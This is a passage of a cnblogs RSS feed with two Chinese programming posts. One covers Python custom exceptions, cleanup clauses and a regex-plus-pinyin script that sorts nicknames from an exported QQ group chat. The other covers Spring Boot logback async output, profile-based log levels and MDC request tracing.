&lt;p&gt;直接或间接的继承 Exception 可以自定义异常。&lt;/p&gt;
&lt;p&gt;异常类中可以定义任何其它类中可以定义的东西，但是通常为了保持简单，只在其中加入几个属性信息，以供异常处理句柄提取。如果新创建的模块中需要抛出几种不同的错误时，通常的作法是为该模块定义异常基类，然后针对不同的错误类型派生出对应的异常子类:&lt;/p&gt;
&lt;div class=&quot;highlight&quot; readability=&quot;17&quot;&gt; 
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;40&quot;&gt;
&lt;pre&gt;
&lt;span&gt;class&lt;/span&gt;&lt;span&gt; Error(Exception):
    &lt;/span&gt;&lt;span&gt;&quot;&quot;&quot;&lt;/span&gt;&lt;span&gt;Base class for exceptions in this module.&lt;/span&gt;&lt;span&gt;&quot;&quot;&quot;&lt;/span&gt;
    &lt;span&gt;pass&lt;/span&gt;

&lt;span&gt;class&lt;/span&gt;&lt;span&gt; InputError(Error):
    &lt;/span&gt;&lt;span&gt;&quot;&quot;&quot;&lt;/span&gt;&lt;span&gt;Exception raised for errors in the input.

    Attributes:
        expression -- input expression in which the error occurred
        message -- explanation of the error
    &lt;/span&gt;&lt;span&gt;&quot;&quot;&quot;&lt;/span&gt;

    &lt;span&gt;def&lt;/span&gt; &lt;span&gt;__init__&lt;/span&gt;&lt;span&gt;(self, expression, message):
        self.expression &lt;/span&gt;=&lt;span&gt; expression
        self.message &lt;/span&gt;=&lt;span&gt; message

&lt;/span&gt;&lt;span&gt;class&lt;/span&gt;&lt;span&gt; TransitionError(Error):
    &lt;/span&gt;&lt;span&gt;&quot;&quot;&quot;&lt;/span&gt;&lt;span&gt;Raised when an operation attempts a state transition that's not
    allowed.

    Attributes:
        previous -- state at beginning of transition
        next -- attempted new state
        message -- explanation of why the specific transition is not allowed
    &lt;/span&gt;&lt;span&gt;&quot;&quot;&quot;&lt;/span&gt;

    &lt;span&gt;def&lt;/span&gt; &lt;span&gt;__init__&lt;/span&gt;&lt;span&gt;(self, previous, next, message):
        self.previous &lt;/span&gt;=&lt;span&gt; previous
        self.next &lt;/span&gt;=&lt;span&gt; next
        self.message &lt;/span&gt;= message
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;与标准异常相似，大多数异常的命名都以 “Error” 结尾。&lt;/p&gt;
&lt;p&gt;很多标准模块中都定义了自己的异常，以报告在他们所定义的函数中可能发生的错误。关于类的进一步信息请参见Classes。&lt;/p&gt;
&lt;h2 id=&quot;_6&quot;&gt;定义清理行为&lt;/h2&gt;
&lt;p&gt;try 语句有可选的子句定义在任何情况下都一定要执行的清理操作。例如:&lt;/p&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;37&quot;&gt;
&lt;pre&gt;
&amp;gt;&amp;gt;&amp;gt; &lt;span&gt;try&lt;/span&gt;&lt;span&gt;:
...     &lt;/span&gt;&lt;span&gt;raise&lt;/span&gt;&lt;span&gt; KeyboardInterrupt
... &lt;/span&gt;&lt;span&gt;finally&lt;/span&gt;&lt;span&gt;:
...     &lt;/span&gt;&lt;span&gt;print&lt;/span&gt;(&lt;span&gt;'&lt;/span&gt;&lt;span&gt;Goodbye, world!&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;)
...
Goodbye, world!
KeyboardInterrupt
Traceback (most recent call last):
  File &lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;&amp;lt;stdin&amp;gt;&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;, line 2, &lt;span&gt;in&lt;/span&gt; &amp;lt;module&amp;gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;不管有没有发生异常，finally子句在程序离开try前都会被执行。当语句中发生了未捕获的异常(或者它发生在except或else子句中），在执行完finally子句后它会被重新抛出。 try语句经由break、continue或return语句退出也会执行finally子句。&lt;/p&gt;

&lt;div class=&quot;cnblogs_code&quot; readability=&quot;44&quot;&gt;
&lt;pre&gt;
&amp;gt;&amp;gt;&amp;gt; &lt;span&gt;def&lt;/span&gt;&lt;span&gt; divide(x, y):
...     &lt;/span&gt;&lt;span&gt;try&lt;/span&gt;&lt;span&gt;:
...         result &lt;/span&gt;= x /&lt;span&gt; y
...     &lt;/span&gt;&lt;span&gt;except&lt;/span&gt;&lt;span&gt; ZeroDivisionError:
...         &lt;/span&gt;&lt;span&gt;print&lt;/span&gt;(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;division by zero!&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;)
...     &lt;/span&gt;&lt;span&gt;else&lt;/span&gt;&lt;span&gt;:
...         &lt;/span&gt;&lt;span&gt;print&lt;/span&gt;(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;result is&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;, result)
...     &lt;/span&gt;&lt;span&gt;finally&lt;/span&gt;&lt;span&gt;:
...         &lt;/span&gt;&lt;span&gt;print&lt;/span&gt;(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;executing finally clause&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;)
...
&lt;/span&gt;&amp;gt;&amp;gt;&amp;gt; divide(2, 1&lt;span&gt;)
result &lt;/span&gt;&lt;span&gt;is&lt;/span&gt; 2.0&lt;span&gt;
executing &lt;/span&gt;&lt;span&gt;finally&lt;/span&gt;&lt;span&gt; clause
&lt;/span&gt;&amp;gt;&amp;gt;&amp;gt; divide(2&lt;span&gt;, 0)
division by zero!
executing &lt;/span&gt;&lt;span&gt;finally&lt;/span&gt;&lt;span&gt; clause
&lt;/span&gt;&amp;gt;&amp;gt;&amp;gt; divide(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;2&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;, &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;1&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;)
executing &lt;/span&gt;&lt;span&gt;finally&lt;/span&gt;&lt;span&gt; clause
Traceback (most recent call last):
  File &lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;&amp;lt;stdin&amp;gt;&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;, line 1, &lt;span&gt;in&lt;/span&gt; &amp;lt;module&amp;gt;&lt;span&gt;
  File &lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;&amp;lt;stdin&amp;gt;&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;, line 3, &lt;span&gt;in&lt;/span&gt;&lt;span&gt; divide
TypeError: unsupported operand type(s) &lt;/span&gt;&lt;span&gt;for&lt;/span&gt; /: &lt;span&gt;'&lt;/span&gt;&lt;span&gt;str&lt;/span&gt;&lt;span&gt;'&lt;/span&gt; &lt;span&gt;and&lt;/span&gt; &lt;span&gt;'&lt;/span&gt;&lt;span&gt;str&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;finally子句多用于释放外部资源(文件或网络连接之类的)。&lt;/p&gt;
&lt;h2 id=&quot;_7&quot;&gt;预定义清理行为&lt;/h2&gt;
&lt;p&gt;有些对象定义了标准的清理行为，无论对象操作是否成功，不再需要该对象的时候就会起作用。以下示例尝试打开文件并把内容输出到屏幕。&lt;/p&gt;
&lt;div class=&quot;highlight&quot; readability=&quot;10.5&quot;&gt; 
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;33&quot;&gt;
&lt;pre&gt;
&lt;span&gt;for&lt;/span&gt; line &lt;span&gt;in&lt;/span&gt; open(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;myfile.txt&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;):
    &lt;/span&gt;&lt;span&gt;print&lt;/span&gt;(line, end=&lt;span&gt;&quot;&quot;&lt;/span&gt;)
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;这段代码的问题在于在代码执行完后没有立即关闭打开的文件。简单的脚本里没什么，但是大型应用程序就会出问题。with语句使得文件之类的对象能及时准确地进行清理。&lt;/p&gt;
&lt;/div&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;33&quot;&gt;
&lt;pre&gt;
with open(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;myfile.txt&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;) as f:
    &lt;/span&gt;&lt;span&gt;for&lt;/span&gt; line &lt;span&gt;in&lt;/span&gt;&lt;span&gt; f:
        &lt;/span&gt;&lt;span&gt;print&lt;/span&gt;(line, end=&lt;span&gt;&quot;&quot;&lt;/span&gt;)
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;语句执行后，文件f总会被关闭，即使是在处理文件行时出错也一样。其它对象是否提供了预定义的清理行为要参考相关文档。&lt;/p&gt;
&lt;h2 id=&quot;_8&quot;&gt;异常处理实例： 正则表达式及拼音排序&lt;/h2&gt;
&lt;p&gt;有某群的某段聊天记录&lt;/p&gt;
&lt;p&gt;现在要求输出排序的qq名，结果类似如下：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;38&quot;&gt;
&lt;pre&gt;
[..., &lt;span&gt;'&lt;/span&gt;&lt;span&gt;本草隐士&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;jerryyu&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;可怜的樱桃树&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;叻风云&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;欧阳-深圳白芒&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;,  ...]
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;需求来源：有个想批量邀请某些qq群的活跃用户到自己的群。又不想铺天盖地去看聊天记录。&lt;/p&gt;
&lt;p&gt;参考资料：&lt;a href=&quot;https://blog.csdn.net/weixin_45625815/article/details/102954072&quot;&gt;python文本处理&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;参考代码：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;37&quot;&gt;
&lt;pre&gt;
&lt;span&gt;#&lt;/span&gt;&lt;span&gt;!/usr/bin/python3&lt;/span&gt;&lt;span&gt;
#&lt;/span&gt;&lt;span&gt; -*- coding: utf-8 -*-&lt;/span&gt;&lt;span&gt;
#&lt;/span&gt;&lt;span&gt; Author:    xurongzhong@126.com wechat:pythontesting qq:37391319&lt;/span&gt;&lt;span&gt;
#&lt;/span&gt;&lt;span&gt; 技术支持 钉钉群：21745728(可以加钉钉pythontesting邀请加入) &lt;/span&gt;&lt;span&gt;
#&lt;/span&gt;&lt;span&gt; qq群：144081101 591302926  567351477&lt;/span&gt;&lt;span&gt;
#&lt;/span&gt;&lt;span&gt; CreateDate: 2018-6-1&lt;/span&gt;

&lt;span&gt;import&lt;/span&gt;&lt;span&gt; re
&lt;/span&gt;&lt;span&gt;from&lt;/span&gt; pypinyin &lt;span&gt;import&lt;/span&gt;&lt;span&gt; lazy_pinyin

name &lt;/span&gt;= r&lt;span&gt;'&lt;/span&gt;&lt;span&gt;test.txt&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;

text &lt;/span&gt;= open(name,encoding=&lt;span&gt;'&lt;/span&gt;&lt;span&gt;utf-8&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;).read()
&lt;/span&gt;&lt;span&gt;#&lt;/span&gt;&lt;span&gt;print(text)&lt;/span&gt;
&lt;span&gt;
results &lt;/span&gt;= re.findall(r&lt;span&gt;'&lt;/span&gt;&lt;span&gt;(:\d+)\s(.*?)\(\d+&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;, text)

names &lt;/span&gt;=&lt;span&gt; set()
&lt;/span&gt;&lt;span&gt;for&lt;/span&gt; item &lt;span&gt;in&lt;/span&gt;&lt;span&gt; results:
    names.add(item[&lt;/span&gt;1&lt;span&gt;])  

keys &lt;/span&gt;=&lt;span&gt; list(names)
keys &lt;/span&gt;=&lt;span&gt; sorted(keys)

&lt;/span&gt;&lt;span&gt;def&lt;/span&gt;&lt;span&gt; compare(char):
    &lt;/span&gt;&lt;span&gt;try&lt;/span&gt;&lt;span&gt;:
        result &lt;/span&gt;=&lt;span&gt; lazy_pinyin(char)[0][0]
    &lt;/span&gt;&lt;span&gt;except&lt;/span&gt;&lt;span&gt; Exception as e:
        result &lt;/span&gt;=&lt;span&gt; char
    &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; result

keys.sort(key&lt;/span&gt;=&lt;span&gt;compare)
&lt;/span&gt;&lt;span&gt;print&lt;/span&gt;(keys)
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;执行示例：&lt;/p&gt;
&lt;p&gt;1，把qq群的聊天记录导出为txt格式，重命名为test.txt&lt;/p&gt;
&lt;p&gt;2, 执行：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;68&quot;&gt;
&lt;pre&gt;
&lt;span&gt;$ python3 qq.py 
[&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;Sally&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;^^O^^&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;aa催乳师&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;bling&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;本草隐士&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;纯中药治疗阳痿早泄&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;长夜无荒&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;东方～慈航&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;干金草&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;广东-曾超庆&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;红梅* 渝&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;jerryyu&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;可怜的樱桃树&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;叻风云&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;欧阳-深圳白芒&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;勝昔堂～元亨&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;蜀中~眉豆。&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;陕西渭南逸清阁*无为&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;吴宁……任&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;系统消息&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;于立伟&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;倚窗望岳&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;烟霞霭霭&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;燕子&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;张强&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;滋味&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;✾买个罐头 吃西餐&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;【大侠】好好&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;【大侠】面向大海～纯中药治烫伤&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;【宗师】吴宁……任&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;【宗师】红梅* 渝&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;【少侠】焚琴煮鹤&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;【少侠】笨笨&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;【掌门】溆浦☞山野人家&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;]
&lt;/pre&gt;&lt;/div&gt;
&lt;h2 id=&quot;_9&quot;&gt;参考资料&lt;/h2&gt;
&lt;ul&gt;&lt;li&gt;python测试等IT技术支持qq群： 887934385(后期会录制视频) &lt;/li&gt;
&lt;/ul&gt;</description>
<pubDate>Fri, 29 Nov 2019 13:39:00 +0000</pubDate>
<dc:creator>pypypypy</dc:creator>
<og:description>Python 中(至少)有两种错误：语法错误(syntax errors)和异常(exceptions)。 语法错误 语法错误又称作解析错误: &amp;gt;&amp;gt;&amp;gt; while True prin</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://www.cnblogs.com/pypypy/p/11960471.html</dc:identifier>
</item>
<item>
<title>springboot+logback日志输出企业实践（下） - Mason技术记录</title>
<link>http://www.cnblogs.com/masonlee/p/11960300.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/masonlee/p/11960300.html</guid>
<description>&lt;blockquote readability=&quot;6&quot;&gt;
&lt;p&gt;一句话概括：logback 在实现了基本的日志输出到文件功能后，在企业实践中，还会有其它的进阶需求，本文对logback的进阶使用进行描述。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;上一篇文章《&lt;a href=&quot;http://t.cn/AigXlD6Q&quot;&gt;springboot+logback 日志输出企业实践（上）&lt;/a&gt;》对 logback 的使用及配置进行描述，并实现按日志级别输出到独立文件功能。但在企业实践中，还会有其它的需求，如需要在多环境下使用不同日志级别，日志输出性能低怎么处理，还有分布式系统如何追踪请求日志等等，对于这些需求，logback 有提供相应的功能，本文将对这几种需求的实现进行讲解。具体有如下内容：&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;使用异步输出日志提高性能&lt;/li&gt;
&lt;li&gt;logback 在多环境下选择日志级别配置&lt;/li&gt;
&lt;li&gt;使用 MDC 在分布式系统中追踪请求&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;如需看源码，本文&lt;a href=&quot;https://github.com/mianshenglee/my-example/tree/master/springboot-logback-demo/logback-advance-demo&quot;&gt;示例工程地址&lt;/a&gt;：&lt;code&gt;https://github.com/mianshenglee/my-example/tree/master/springboot-logback-demo&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;logback &lt;a href=&quot;http://logback.qos.ch/manual/configuration.html&quot;&gt;官方文档&lt;/a&gt;指出，强烈建议启用 logback 状态数据的输出，将会在很大程度上帮助我们诊断 logback 相关问题。通过这些状态数据，可以知道 logback 配置文件加载情况，配置中对应的 appender，logger的装载情况等。启用状态数据输出有两种方式：&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;在根元素( configuration ) 中设置属性&lt;code&gt;debug=&quot;true&quot;&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;添加元素( statusListener )，class 使用&lt;code&gt;OnConsoleStatusListener&lt;/code&gt;。如下：&lt;/li&gt;
&lt;/ul&gt;&lt;pre class=&quot;xml&quot;&gt;
&lt;code&gt;&amp;lt;!-- 输出logback的本身状态数据 --&amp;gt;
&amp;lt;statusListener class=&quot;ch.qos.logback.core.status.OnConsoleStatusListener&quot; /&amp;gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;blockquote readability=&quot;6&quot;&gt;
&lt;p&gt;注意，二者选其一即可，此处的 debug 与配置文件中的日志级别没有关系，只用于表示输出状态数据。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;本示例中，使用第二种方式（添加 &lt;code&gt;statusListener&lt;/code&gt; 元素），添加后，输出内容如下所示：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://gitee.com/mianshenglee/datastorage/raw/master/md-photo/logback/logback-status-data.png&quot; alt=&quot;logback状态数据&quot;/&gt;&lt;/p&gt;

&lt;h2 id=&quot;异步输出配置&quot;&gt;3.1 异步输出配置&lt;/h2&gt;
&lt;p&gt;按之前的 logback 配置，日志输出到文件是同步输出的，即每次输出都会直接写IO到磁盘文件，从而产生阻塞，造成不必要的性能损耗。当然，对于一般的应用，影响不大，但对于高并发的应用，还是有必要对性能进行优化的。logback 提供了日志异步输出的 AsyncAppender。 异步输出日志的方式很简单，添加一个基于异步写日志的&lt;code&gt;appender&lt;/code&gt;，并指向原先配置的&lt;code&gt;appender&lt;/code&gt;即可 。见以下配置：&lt;/p&gt;
&lt;pre class=&quot;xml&quot;&gt;
&lt;code&gt;&amp;lt;!-- 异步输出 --&amp;gt;
&amp;lt;appender name=&quot;ASYNCDEBUG&quot; class=&quot;ch.qos.logback.classic.AsyncAppender&quot;&amp;gt;
    &amp;lt;!-- 默认如果队列的80%已满,则会丢弃TRACT、DEBUG、INFO级别的日志，若要保留全部日志，设置为0 --&amp;gt;
    &amp;lt;discardingThreshold&amp;gt;0&amp;lt;/discardingThreshold&amp;gt;
    &amp;lt;!-- 更改默认的队列的深度,该值会影响性能.默认值为256 --&amp;gt;
    &amp;lt;queueSize&amp;gt;1024&amp;lt;/queueSize&amp;gt;
    &amp;lt;!-- 添加附加的appender,最多只能添加一个 --&amp;gt;
    &amp;lt;appender-ref ref=&quot;DEBUGFILE&quot;/&amp;gt;
    &amp;lt;includeCallerData&amp;gt;true&amp;lt;/includeCallerData&amp;gt;
&amp;lt;/appender&amp;gt;
//INFO 结构同上，略
//WARN 结构同上，略
//ERROR 结构同上，略
&amp;lt;!-- 异步输出关联到root --&amp;gt;
&amp;lt;root level=&quot;DEBUG&quot;&amp;gt;
    &amp;lt;appender-ref ref=&quot;STDOUT&quot;/&amp;gt;
    &amp;lt;appender-ref ref=&quot;ASYNCDEBUG&quot; /&amp;gt;
    ...//略
&amp;lt;/root&amp;gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;AsyncAppender 对应需要设置的参数主要有 :&lt;/p&gt;
&lt;table&gt;&lt;thead/&gt;&lt;tbody readability=&quot;8.8448275862069&quot;&gt;&lt;tr class=&quot;odd&quot; readability=&quot;2&quot;&gt;&lt;td&gt;queueSize&lt;/td&gt;
&lt;td&gt;&lt;code&gt;int&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;队列的最大容量，默认为 256&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;even&quot; readability=&quot;4&quot;&gt;&lt;td&gt;discardingThreshold&lt;/td&gt;
&lt;td&gt;&lt;code&gt;int&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;默认，当队列还剩余 20% 的容量时，会丢弃级别为 TRACE, DEBUG 与 INFO 的日志，仅仅只保留 WARN 与 ERROR 级别的日志。想要保留所有的事件，可以设置为 0&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;odd&quot; readability=&quot;3.9583333333333&quot;&gt;&lt;td&gt;includeCallerData&lt;/td&gt;
&lt;td&gt;&lt;code&gt;boolean&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;获取调用者的数据相对来说比较昂贵。为了提高性能，默认情况下不会获取调用者的信息。默认情况下，只有像线程名或者 &lt;a href=&quot;https://logback.qos.ch/manual/mdc.html&quot;&gt;MDC&lt;/a&gt; 这种&quot;便宜&quot;的数据会被复制。设置为 true 时，appender 会包含调用者的信息&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;even&quot; readability=&quot;4.8&quot;&gt;&lt;td&gt;maxFlushTime&lt;/td&gt;
&lt;td&gt;&lt;code&gt;int&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;根据所引用 appender 队列的深度以及延迟， &lt;code&gt;AsyncAppender&lt;/code&gt; 可能会耗费长时间去刷新队列。当 &lt;code&gt;LoggerContext&lt;/code&gt; 被停止时， &lt;code&gt;AsyncAppender stop&lt;/code&gt; 方法会等待工作线程指定的时间来完成。使用 maxFlushTime 来指定最大的刷新时间，单位为毫秒。在指定时间内没有被处理完的事件将会被丢弃。这个属性的值的含义与 &lt;a href=&quot;http://docs.oracle.com/javase/7/docs/api/java/lang/Thread.html#join(long)&quot;&gt;Thread.join(long)&lt;/a&gt; 相同&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;odd&quot; readability=&quot;3&quot;&gt;&lt;td&gt;neverBlock&lt;/td&gt;
&lt;td&gt;&lt;code&gt;boolean&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;默认为 false，在队列满的时候 appender 会阻塞而不是丢弃信息。设置为 true，appender 不会阻塞你的应用而会将消息丢弃&lt;/td&gt;
&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;h2 id=&quot;异步输出原理&quot;&gt;3.2 异步输出原理&lt;/h2&gt;
&lt;p&gt;AsyncAppender 的实现方式是通过阻塞队列( &lt;code&gt;BlockingQueue&lt;/code&gt; )来避免日志直接输出到文件，而是把日志事件输出到 &lt;code&gt;BlockingQueue&lt;/code&gt; 中，然后启动一个新的worker线程，主线程不阻塞，worker线程则从队列中获取需要写的日志，异步输出到对应的位置。&lt;/p&gt;

&lt;p&gt;使用 springboot 进行应用开发，支持对多环境的配置支持，只需要按&lt;code&gt;application-*.properties&lt;/code&gt; 格式添加配置文件，然后使用 &lt;code&gt;spring.profiles.active&lt;/code&gt; 指定环境即可。同样，日志输出，一般在开发环境，使用 DEBUG 级别，以便以检查问题，而在生产环境，则只输出 ERROR 级别的日志。如下所示，profile定义开发环境为 dev ，生产环境为 prod：&lt;/p&gt;
&lt;pre class=&quot;xml&quot;&gt;
&lt;code&gt;&amp;lt;!-- 开发环境:debug级别--&amp;gt;
&amp;lt;springProfile name=&quot;dev&quot;&amp;gt;
    &amp;lt;root level=&quot;DEBUG&quot;&amp;gt;
        &amp;lt;appender-ref ref=&quot;STDOUT&quot;/&amp;gt;
        ...//略
    &amp;lt;/root&amp;gt;
&amp;lt;/springProfile&amp;gt;

&amp;lt;!-- 生产环境:error级别--&amp;gt;
&amp;lt;springProfile name=&quot;prod&quot;&amp;gt;
    &amp;lt;root level=&quot;INFO&quot;&amp;gt;
        &amp;lt;appender-ref ref=&quot;STDOUT&quot;/&amp;gt;
        ...//略
    &amp;lt;/root&amp;gt;
&amp;lt;/springProfile&amp;gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;上述配置是对 root 进行 设置（当然，其它元素也可以使用）。经过此设置后，则会根据 &lt;code&gt;spring.profiles.active&lt;/code&gt; 而决定使用指定日志级别输出。&lt;/p&gt;
&lt;blockquote readability=&quot;7&quot;&gt;
&lt;p&gt;其实 logback 还支持使用 if 元素，使用 if-then-else 的形式，结合 condition 属性来实现条件处理。有兴趣的读者可以看官方文档说明 &quot;Conditional processing of configuration files&quot;&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;使用springboot开发分布式应用，很多都微服务化，当请求过来，可能需要调用多个服务来完成请求动作。在查询日志时，特别是请求量大的情况下，日志多，很难找到对应请求的日志，造成定位异常难，日志难以追踪等问题。针对此类问题，logback 提供了 MDC （ Mapped Diagnostic Contexts 诊断上下文映射 ），MDC可以让开发人员可以在 &lt;em&gt;诊断上下文&lt;/em&gt; 中放置信息，这些消息是内部使用了 ThreadLocal实现了线程与线程之间的数据隔离，管理每个线程的上下文信息 。而在日志输出时，可以通过标识符&lt;code&gt;%X{key}&lt;/code&gt; 来输出MDC中的设置的内容。因此，在分布式应用在追踪请求时，实现思路如下：&lt;/p&gt;
&lt;ol&gt;&lt;li&gt;web应用中，添加拦截器，在请求进入时，添加唯一id作为&lt;code&gt;request-id&lt;/code&gt;，以标识此次请求。&lt;/li&gt;
&lt;li&gt;添加此 &lt;code&gt;request-id&lt;/code&gt; 到MDC中&lt;/li&gt;
&lt;li&gt;若需要调用其它服务，把此&lt;code&gt;request-id&lt;/code&gt;作为 header 参数&lt;/li&gt;
&lt;li&gt;在日志输出时，添加此&lt;code&gt;request-id&lt;/code&gt;的输出作为标识&lt;/li&gt;
